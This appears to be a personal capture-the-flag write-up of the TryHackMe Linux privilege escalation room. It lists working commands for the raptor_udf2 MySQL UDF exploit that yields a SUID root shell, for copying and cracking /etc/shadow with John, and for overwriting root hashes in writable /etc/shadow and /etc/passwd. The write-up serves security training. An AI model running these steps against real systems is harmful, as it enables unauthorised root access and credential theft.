# Overview
https://tryhackme.com/room/linuxprivesc

```
export IP=10.10.191.59
```
# [Service Exploits](setuid-exploit)
The MySQL service is running as root and the "root" user for the service does not have a password assigned.
We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands
as root via the MySQL service.

1. Change into the /home/user/tools/mysql-udf directory:
```
cd /home/user/tools/mysql-udf
```
1. Compile the raptor\_udf2.c exploit code using the following commands:
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
1. Connect to the MySQL service as the root user with a blank password:
```
mysql -u root
```
1. Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:
```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
1. Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
1. Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
1. Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!
```
rm /tmp/rootbash
exit
```

# John
```
scp user@$IP:/etc/shadow hash.txt
vagrant@ubuntu1804:~/repos/ctfs/thm/linux-priv-esc$ /opt/john/run/john --wordlist=/opt/wordlists/rockyou.txt root.txt
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
password123      (root)
1g 0:00:00:00 DONE (2020-12-15 02:20) 2.083g/s 3200p/s 3200c/s 3200C/s cuties..mexico1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

# /etc/shadow hash is editable
```
user@debian:~/tools/mysql-udf$ mkpasswd -m sha-512 newpasswordhere
$6$zcsibADe2$5JBJvfuuLdM2/0ggQxfpWwpQ0S/0vcx2.eoUTNKbBM.MncgN3e12fQUMRMbT9Sukpe04R3bviwfMvgJ5Nh6L0/
```
Paste that output into the root user hash field

# /etc/passwd hash is editable
```
root@debian:/home/user/tools/mysql-udf# ls -l /etc/passwd
-rw-r--rw- 1 root root 1009 Aug 25  2019 /etc/passwd
root@debian:/home/user/tools/mysql-udf# openssl passwd newpasswordhere
Warning: truncating password to 8 characters
LHD3iy7IoLObw
```
Replace the 'x' in the root line
